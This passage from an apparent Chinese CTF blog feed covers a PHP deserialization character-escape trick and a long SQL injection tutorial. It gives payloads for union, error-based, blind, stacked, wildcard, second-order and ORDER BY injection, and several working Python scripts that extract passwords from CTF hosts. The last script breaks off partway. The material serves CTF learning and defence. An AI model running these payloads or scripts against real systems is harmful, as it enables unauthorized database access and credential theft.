class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">tmp</span>(<span class="hljs-variable">$str1</span>, <span class="hljs-variable">$str2</span>));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;easy&quot;</span>, <span class="hljs-string">&quot;ez&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs payload">$str1 = &#x27;easyeasyeasyeasyeasyeasyeasyeasyeasy&#x27;;<br>$str2 = &#x27;;s:4:&quot;str2&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;;<br></code></pre></td></tr></table></figure><h3 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h3><p>可以在命令执行的那个类禁止反序列化，添加wakeup函数，当然这只是对于不能绕过__wakeup的php版本有效</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">function</span> <span class="hljs-constructor">__wakeup()</span> &#123;<br>throw <span class="hljs-keyword">new</span> \<span class="hljs-constructor">LogicException( <span class="hljs-params">__CLASS__</span> . &#x27; <span class="hljs-params">should</span> <span class="hljs-params">never</span> <span class="hljs-params">be</span> <span class="hljs-params">unserialized</span>&#x27; )</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h3><p><em><a href="https://blog.csdn.net/qq_45521281/article/details/107135706">反序列化字符逃逸</a></em></p><p><a href="https://github.com/fine-1/php-SER-libs">反序列化靶场</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2023/01/31/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/31/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h1><ul><li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li><li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li><li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li></ul><h3 id="mysql数据库"><a class="markdownIt-Anchor" href="#mysql数据库"></a> mysql数据库</h3><p>cmd连接数据库：</p><ol><li>配置好环境变量</li><li>登录：mysql -u用户名 –p</li></ol><p>几个常用命令：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">展示数据库中包含的全部库：<span class="hljs-keyword">show</span> databases;<br>展示库中的所有表：<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br>展示表的字段结构：<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> 表名;  或者：<span class="hljs-keyword">desc</span> 表名;<br>查询表中的数据：<span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span>,列名<span class="hljs-number">2</span>,列名<span class="hljs-number">3</span>……. <span class="hljs-keyword">from</span> 表名 <br>% 匹配任意字符<br>_ 匹配单个字符<br></code></pre></td></tr></table></figure><p>数据库结构：库-&gt;表-&gt;列-&gt;行</p><img src="/2023/01/31/SQL%E6%B3%A8%E5%85%A5/1.jpg" class=""><h3 id="sql注入点挖掘"><a class="markdownIt-Anchor" href="#sql注入点挖掘"></a> SQL注入点挖掘</h3><p>登录界面或者查询框先尝试万能密码： a’ or ‘1’=’1或者 admin’-- (注释符) 或者‘^0# 或者*,1</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">有回显<br>联合查询 -&gt;构造联合查询语句  <br>报错注入 -&gt;构造报错语句<br>堆查询   -&gt;多行语句执行<br><br>无回显        <br>盲注   -&gt;布尔型/时间型 通过某种手段“爆破”结果<br><br>整形注入：<br>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。<br>测试方法：(<span class="hljs-number">1</span>)加引号报错（单引号没报错的话，尝试双引号）（<span class="hljs-number">2</span>）加注释符还是报错<br><br>字符型注入:(单引号没报错尝试双引号)<br>www.xxx.com/ccc.php?id=<span class="hljs-number">1</span>’ <span class="hljs-keyword">and</span> ‘<span class="hljs-number">1</span>’=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">页面正常，继续下一步</span><br><span class="hljs-string">www.xxx.com/ccc.php?id=1’ and ‘1’=&#x27;</span><span class="hljs-number">2</span><br>页面报错，则说明存在字符型注入。<br><br><br><span class="hljs-comment">## 被过滤时可以用fuzz测试过滤内容</span><br></code></pre></td></tr></table></figure><h2 id="一次注入"><a class="markdownIt-Anchor" href="#一次注入"></a> 一次注入</h2><h3 id="联合注入"><a class="markdownIt-Anchor" href="#联合注入"></a> 联合注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">payload:<br>1.判断数字型注入还是字符型注入 <br>2.测试字段个数 <br>1&#x27; order by 3 #;  （回显正常）即执行： SELECT id,user,password FROM sql_bug WHERE id = &#x27; 1 &#x27; order by 3 #&#x27; limit 1<br>1&#x27; order by 4 #;  （回显错误）即执行： SELECT id,user,password FROM sql_bug WHERE id = &#x27; 1 &#x27; order by 4 #&#x27; limit 1<br>3.爆出库名 union select 1,2,database() #<br>有时候需要查看其他数据库名<br>0 union select 1,group_concat(schema_name) from information_schema.schemata#<br>4.爆出表名 <br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # <br>5.爆出字段名 <br>union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’’ # <br>6.查询最终的数据 union select group_concat(字段名)from 表名<br></code></pre></td></tr></table></figure><h3 id="报错型注入"><a class="markdownIt-Anchor" href="#报错型注入"></a> 报错型注入</h3><p>（一般在没法用联合查询时才用）</p><h4 id="extractvaule报错"><a class="markdownIt-Anchor" href="#extractvaule报错"></a> ExtractVaule报错</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less">正确形式：<span class="hljs-selector-tag">extractvalue</span>(XML_document,Xpath_string)<br>报错注入： <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>,payload) <br>例：<span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e))     <span class="hljs-comment">//至于是and还是or，需要让这个报错语句能够被执行</span><br><span class="hljs-selector-tag">extractvalue</span>函数每一次只能显示<span class="hljs-number">32</span>位字符， 所以我们需要使用<span class="hljs-selector-tag">left</span>和<span class="hljs-selector-tag">right</span>函数分两次将<span class="hljs-selector-tag">flag</span>左边的内容和右边的内容显示出来，默认从左边取，<br>取右边：<span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,select <span class="hljs-built_in">group_concat</span>(<span class="hljs-built_in">right</span>(password,<span class="hljs-number">30</span>))from))<br></code></pre></td></tr></table></figure><h4 id="updatexml-报错"><a class="markdownIt-Anchor" href="#updatexml-报错"></a> updateXML 报错</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">updateXML</span> 报错<br>正确形式：<span class="hljs-selector-tag">updatexml</span>（<span class="hljs-selector-tag">XML_document</span>,<span class="hljs-selector-tag">XPath_string</span>,<span class="hljs-selector-tag">new_value</span>）<br>报错注入： <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">updatexml</span>(<span class="hljs-number">1</span>,payload,<span class="hljs-number">1</span>) 例：<span class="hljs-selector-tag">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span> )<br>在<span class="hljs-selector-tag">ASCII</span>码表中，<span class="hljs-number">0</span><span class="hljs-selector-tag">x7e</span>这个十六进制数代表符号~，~这个符号在<span class="hljs-selector-tag">xpath</span>语法中是不存在的，因此总能报错<br></code></pre></td></tr></table></figure><h3 id="盲注"><a class="markdownIt-Anchor" href="#盲注"></a> 盲注</h3><p>（只回显正确错误或者不会报错具体内容）</p><h4 id="布尔型注入"><a class="markdownIt-Anchor" href="#布尔型注入"></a> 布尔型注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1’and 1=1 /and 1=2 尝试后页面有变化 <br>确定数据库长度：?Id=1’ and length((database()))=8 --+<br>确定数据库名称：?id=1’ and ascii(substring(database(),1,1))=115--+<br>确定表的个数：?id=1’ and length(((select concat_ws(0x7e,table_name) from%20information_schema.tables where table_schema=database() limit 4,1)))&gt;1--+<br>确定每个表的长度：?id=1’ and length(((select concat_ws(0x7e,table_name) from information_schema.tables where table_schema=database() limit 0,1)))=6--+<br>确定每个表达名称：?id=1’ and ascii(substring((select concat_ws(0x7e,table_name) from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+<br>确定每一列的长度：?id=1&#x27; and length(((select concat_ws(0x7e,column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))=2--+<br>确定每一列的名称：?id=1&#x27; and ascii(substring((select concat_ws(0x7e,column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)) =105--+<br>确定数据：?id=1&#x27; and ascii(substring((select concat_ws(0x7e,username,password) from users limit 0,1),1,1)) =68--+<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://61.147.171.105:53758/view.php?no=&#x27;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span> &lt; <span class="hljs-built_in">max</span>:<br>        mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        payload = <span class="hljs-string">f&quot;1 and ascii(substring((select group_concat(username,passwd) from users limit 0,1),<span class="hljs-subst">&#123;i&#125;</span>,1)) &gt;<span class="hljs-subst">&#123;mid&#125;</span>--+&quot;</span><br>        response = requests.get(url=url + payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">min</span> != <span class="hljs-number">32</span>:<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">min</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h4 id="时间延时注入"><a class="markdownIt-Anchor" href="#时间延时注入"></a> 时间延时注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">报错注入与布尔注入时无反应，可尝试基于时间的注入<br>sleep()参数写数字，此函数用于将时间延迟，参数的单位是秒<br>IF(SUBSTR(password,1,1)=1,BENCHMARK(100000,SHA1(1337)),0) #sleep过滤时可替换<br>if(expr1,expr2,expr3)若expr1为真则执行expr2，否则执行expr3<br>根据真假的不同网站的返回时间进行注入，<br>?id=1 and sleep(10)--+<br>?id=1 &#x27;and sleep(10)--+<br>?id=1’ and if(ascii(left(database(),1))=115,sleep(5),1)--+<br>?id=1&#x27;and if(ascii(substring((select table_name from information_schema.tables where table_schema=&#x27;security&#x27;limit 0,1),1,1))&gt;0,sleep(2),1)--+<br>后面步骤同布尔盲注<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span> &lt; <span class="hljs-built_in">max</span>:<br>        mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># payload = f&quot;-1/**/||if(ascii(substring((select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/5,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)/**/%23&quot; #ctf</span><br>        <span class="hljs-comment"># payload=f&quot;-1/**/||if(ascii(substring((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&#x27;ctf&#x27;/**/limit/**/0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)/**/%23&quot; #items</span><br>        <span class="hljs-comment"># payload=f&quot;-1/**/||if(ascii(substring((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;items&#x27;/**/limit/**/3,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)/**/%23&quot; # id,name,price</span><br>        payload=<span class="hljs-string">f&quot;-1/**/||if(ascii(substring((select/**/right(group_concat(name,price),46)/**/from/**/items),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(2),1)/**/%23&quot;</span><br>        t1 = time.time()<br>        response = requests.get(url=url + payload)<br>        t2 = time.time()<br>        <span class="hljs-keyword">if</span> t2 - t1 &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">min</span> != <span class="hljs-number">32</span>:<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">min</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h3 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入"></a> 堆叠注入</h3><p>（select 被过滤时考虑用show）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Show databases;<br>Use 数据库名；show tables;<br>Show columns from 表名;<br>更改表名：alter table 旧表名 rename to 新表名         //在可回想部分表内容时，可以把要显示的表名修改成要有显示的表名<br>更改列名：alter table 表名 change 旧列名 新列名 新列名的数据类型<br> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>语法：//users处为表名<br>Handler users open;<br>Handler users read first;<br>Handler users read next;<br>Handler users close;<br></code></pre></td></tr></table></figure><h3 id="通配符攻击"><a class="markdownIt-Anchor" href="#通配符攻击"></a> 通配符攻击</h3><p>可以用来爆破</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">password</span> =<span class="hljs-string">&#x27;flag%&#x27;</span>--+<span class="hljs-string">&#x27;</span><br><span class="hljs-string">alpha = string.hexdigits</span><br><span class="hljs-string">pswd = &#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">while True:</span><br><span class="hljs-string">    flag = True</span><br><span class="hljs-string">    for i in alpha:</span><br><span class="hljs-string">        post_data = &#123;&quot;username&quot;: &quot;admin&quot;,</span><br><span class="hljs-string">                     &quot;password&quot;: f&quot;1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">password</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;&#123;pswd + i&#125;%&#x27;</span>#<span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string">        response = requests.post(url, data=post_data)</span><br><span class="hljs-string">        time.sleep(0.1)</span><br><span class="hljs-string">        if &quot;</span>something<span class="hljs-string">&quot; not in response.text:</span><br><span class="hljs-string">            pswd += i</span><br><span class="hljs-string">            print(pswd)</span><br><span class="hljs-string">            flag = False</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if flag:</span><br><span class="hljs-string">        break</span><br></code></pre></td></tr></table></figure><h2 id="二次注入"><a class="markdownIt-Anchor" href="#二次注入"></a> 二次注入</h2><p>二次注入需要先把注入的语句写入数据库，等下一次查询到该语句是再的新的语句构成注入</p><p>一般注入点在有写入数据库的位置，注入的东西要结合查询语句去构造</p><h3 id="insert-into-注入"><a class="markdownIt-Anchor" href="#insert-into-注入"></a> INSERT INTO 注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO users (username,password) values (&#x27;%s&#x27;, &#x27;%s&#x27;)&quot;, $_POST[&quot;username&quot;], $_POST[&quot;password&quot;]<br></code></pre></td></tr></table></figure><p>由于输入的数据直接拼接到mysql语句中，并且没有做过滤，就会导致恶意sql语句注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">username=abc&#x27;,HEX(SUBSTR((SELECT password FROM (SELECT * FROM users)tmp WHERE username=&#x27;admin&#x27;),1,1)))-- &amp;password=1<br></code></pre></td></tr></table></figure><p>注意：要有引号闭合，最后要多一个<code>)</code>闭合，注释符:<code>-- </code>,因为对大小写不敏感，所以用hex编码来区分</p><p>将要查找的值读完存起来，再想方法把值读出来</p><h3 id="order-by-爆破密码"><a class="markdownIt-Anchor" href="#order-by-爆破密码"></a> ORDER BY 爆破密码</h3><p>看一道HKCERT CTF2023 的题目</p><p>有注入点的代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">cursor.execute(f&quot;<span class="hljs-keyword">SELECT</span> username, publicnote <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> &#123;column&#125; &#123;ascending&#125;;&quot;)<br></code></pre></td></tr></table></figure><p>这里用<code>&#123;column&#125;</code>而不是<code>(%s),(column)</code>,所以存在sql注入</p><p>题目大概是拿到Administrator的密码(16为十进制数)然后登录获取flag</p><p>利用<code>order by</code>的排序规则，每次注册一个用户，然后按照密码某一位排序，通过相对位置可以推算出密码，小坑就是相同字母排序好像是随机的，所以最终会导致推算不准，需要进一步爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://chal-a.hkcert23.pwnable.hk:28107/&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">signup</span>(<span class="hljs-params">username, password</span>):<br>    header = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>&#125;<br>    cookie = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;1e45ea4eb9daa404b6e75847ca9e2558&quot;</span>&#125;<br>    data = &#123;<span class="hljs-string">&quot;username&quot;</span>: username, <span class="hljs-string">&quot;password&quot;</span>: password&#125;<br>    data = json.dumps(data)<br>    r = requests.post(url=url + <span class="hljs-string">&#x27;signup&#x27;</span>, cookies=cookie, headers=header, data=data)<br>    <span class="hljs-comment"># print(r.text)</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">note</span>(<span class="hljs-params">token, i, username1, username2</span>):<br>    payload = <span class="hljs-string">f&#x27;?noteType=public&amp;column=right(left(password,<span class="hljs-subst">&#123;i&#125;</span>),1)&amp;ascending=ASC&#x27;</span><br>    cookie = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;1e45ea4eb9daa404b6e75847ca9e2558&quot;</span>, <span class="hljs-string">&quot;token&quot;</span>: token&#125;<br>    r = requests.get(url=url + <span class="hljs-string">&#x27;/note&#x27;</span> + payload, cookies=cookie)<br>    <span class="hljs-comment"># print(r.text)</span><br>    JSON = json.loads(r.text)<br>    <span class="hljs-comment"># print(JSON)</span><br>    <span class="hljs-keyword">for</span> j, item <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(JSON[<span class="hljs-string">&#x27;content&#x27;</span>]):<br>        <span class="hljs-keyword">if</span> item[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;Administrator&#x27;</span>:<br>            index_admin = j<br>        <span class="hljs-keyword">elif</span> item[<span class="hljs-string">&#x27;username&#x27;</span>] == username1:<br>            index_username1 = j<br>        <span class="hljs-keyword">elif</span> item[<span class="hljs-string">&#x27;username&#x27;</span>] == username2:<br>            index_username2 = j<br><br>    <span class="hljs-keyword">if</span> index_username1 &lt; index_admin <span class="hljs-keyword">and</span> index_admin &lt; index_username2:<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yes&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">47</span>, <span class="hljs-number">57</span>, <span class="hljs-number">1</span>):<br><br>            username1 = <span class="hljs-string">f&#x27;bccdd<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span> + <span class="hljs-built_in">chr</span>(j)<br>            password1 = <span class="hljs-string">&#x27;0&#x27;</span> * (i - <span class="hljs-number">1</span>) + <span class="hljs-built_in">chr</span>(j) + <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">16</span> - i)<br>            signup(username1, password1)<br>            token1 = base64.b64encode(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;username1&#125;</span>:<span class="hljs-subst">&#123;password1&#125;</span>&quot;</span>.encode()).decode()<br>            <span class="hljs-keyword">if</span> (j == <span class="hljs-number">56</span>):<br>                username2 = <span class="hljs-string">f&#x27;bbccd<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span> + <span class="hljs-built_in">chr</span>(j + <span class="hljs-number">3</span>)<br>                password2 = <span class="hljs-string">&#x27;0&#x27;</span> * (i - <span class="hljs-number">1</span>) + <span class="hljs-built_in">chr</span>(j + <span class="hljs-number">3</span>) + <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">16</span> - i)<br>            <span class="hljs-keyword">else</span>:<br>                username2 = <span 